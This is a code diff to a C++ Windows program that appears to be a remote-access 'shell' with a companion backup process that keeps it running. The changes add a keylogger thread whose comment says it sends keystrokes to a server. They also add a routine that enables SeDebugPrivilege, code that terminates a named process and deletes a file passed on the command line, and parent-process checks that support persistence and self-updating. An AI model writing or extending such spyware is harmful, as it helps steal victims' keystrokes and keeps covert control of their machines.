@@ -2,8 +2,11 @@
 #include "serviceutils.h"
 #include "utils.h"
 
-#include <Windows.h>
+#include <windows.h>
 #include <psapi.h>
+#include <shellapi.h>
+
+typedef __success(return >= 0) LONG NTSTATUS;
 
 //Thread used to check if main shell is running, and if it not start it
 void BackupThread();
@@ -13,12 +16,44 @@ void CheckBackupRunningThread();
 void CreateAndStartBackupOnDisk();
 //Also name self explanatory
 void RestartBackupShellAndExit();
+//Used to set privileges on the current process, in particular to terminate a system process
+NTSTATUS EnablePrivilege(wchar_t* privilege);
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)	//main function
 {
-	//MessageBoxA(NULL, "UPDATE", "UPDATE", MB_OK);
 	//Alloc console for debug purposes
 	CreateDebugConsole();
+
+	//Process to terminate at start
+	std::string args(lpCmdLine);
+	if (args.length()) {
+		Log("Given process to close in argument\n");
+		//NTSTATUS result = EnablePrivilege(L"SeDebugPrivilege");
+		//if (result != 0)
+		//{
+		//	Log("could not set SE_DEBUG_NAME Privilege\n");
+		//}
+		int split_index = args.find(',');
+		std::string to_del = args.substr(0, split_index);
+		std::string to_close = args.substr(split_index + 1, args.length() + 1);
+
+		HANDLE hProc = 0;
+		auto procID = Utils::getProcess(to_close.c_str(), false);
+		if (procID) {
+			Log("Found proc ID\n");
+			const auto hBackupShell = OpenProcess(PROCESS_TERMINATE, false, procID);
+			TerminateProcess(hBackupShell, 1);
+			CloseHandle(hBackupShell);
+		}
+		else {
+			Log("Proc ID not found\n");
+		}
+
+		remove(to_del.c_str());
+	}
+	else {
+		Log("No args given\n");
+	}
 
 	Utils::CheckFullPath();
 
@@ -52,6 +87,7 @@ useless_backup_shell_code:
 				if (mbi.Protect)
 					goto useless_backup_shell_code;
 			}
+			Sleep(1000);
 		}
 	}
 
@@ -61,9 +97,11 @@ non_backup_shell_code:
 	Log("Got to main shell code\n");
 	Utils::CheckFullPath();
 	//Check that parent process name == SHELL_BACKUP_NAME
-	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, Utils::getParentProcess(Utils::getProcess(SHELL_NAME)));
-	if (!hProcess)
+	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, Utils::getParentProcess(GetCurrentProcessId()));
+	if (!hProcess) {
+		CreateAndStartBackupOnDisk();
 		PauseAndExit(1);
+	}
 	//Check parent process full path to make sure that it's the backup shell and that it was started from the right folder
 	CHAR Buffer[MAX_PATH];
 	if (GetModuleFileNameExA(hProcess, 0, Buffer, MAX_PATH))
@@ -90,6 +128,8 @@ non_backup_shell_code:
 
 	//Delete update file
 	remove(SHELL_PATH(SHELL_UPDATE_NAME));
+
+	_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)Client::KeyloggerThread, NULL, NULL, NULL); //Thread to send keylogs to server
 
 	//Main loop
 	while (true)
@@ -135,6 +175,34 @@ void DebuggerThread() {
 	}
 }
 
+NTSTATUS EnablePrivilege(wchar_t* privilege)
+{
+	HANDLE token;
+	TOKEN_PRIVILEGES* tp = NULL;
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token))
+		goto error;
+
+	tp = (TOKEN_PRIVILEGES*)new char[offsetof(TOKEN_PRIVILEGES, Privileges[1])];
+	if (!tp)
+		goto error;
+	tp->PrivilegeCount = 1;
+	tp->Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+	if (!LookupPrivilegeValueW(0, privilege, &tp->Privileges[0].Luid))
+		goto error;
+
+	if (!AdjustTokenPrivileges(token, 0, tp, 0, 0, 0) || GetLastError() != ERROR_SUCCESS)
+		goto error;
+
+	CloseHandle(token);
+
+	return 0x0;
+error:
+	if (tp)
+		delete[] tp;
+
+	return 0xC0000001;
+}
+
 void BackupThread() {
 	//Check if this executable is the backup executable
 	if (strcmp(ExePathA(), SHELL_BACKUP_EXE)) { //If full module path != backup module path, do nothing
@@ -145,9 +213,15 @@ void BackupThread() {
 		//If more than 1 backup shell is running exit process
 		if (Utils::getProcessCount(SHELL_BACKUP_NAME) > 1) { 
 			Log("Another backup shell found, closing it\n");
+			NTSTATUS result = EnablePrivilege(L"SeDebugPrivilege");
+			if (result != 0)
+			{
+				Log("could not set SE_DEBUG_NAME Privilege\n");
+			}
 			HANDLE hProc = 0;
 			auto procID = Utils::getProcess(SHELL_BACKUP_NAME);
 			if (procID) {
+				Log("Found backup shell process ID\n");
 				const auto hBackupShell = OpenProcess(PROCESS_TERMINATE, false, procID);
 				TerminateProcess(hBackupShell, 1);
 				CloseHandle(hBackupShell);
@@ -271,6 +345,7 @@ void CheckBackupRunningThread() {
 	if (!procID) {
 		RestartBackupShellAndExit();
 	}
+
 	hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
 
 	//Main loop of the routine
@@ -291,7 +366,7 @@ void CheckBackupRunningThread() {
 				TerminateProcess(hBackupShell, 1);
 				CloseHandle(hBackupShell);
 			}
-			PauseAndExit(10);
+			while (1) Sleep(1000); //Wait for updating thread to close process once the update has finished downloading
 		}
 		Sleep(100);
 	}
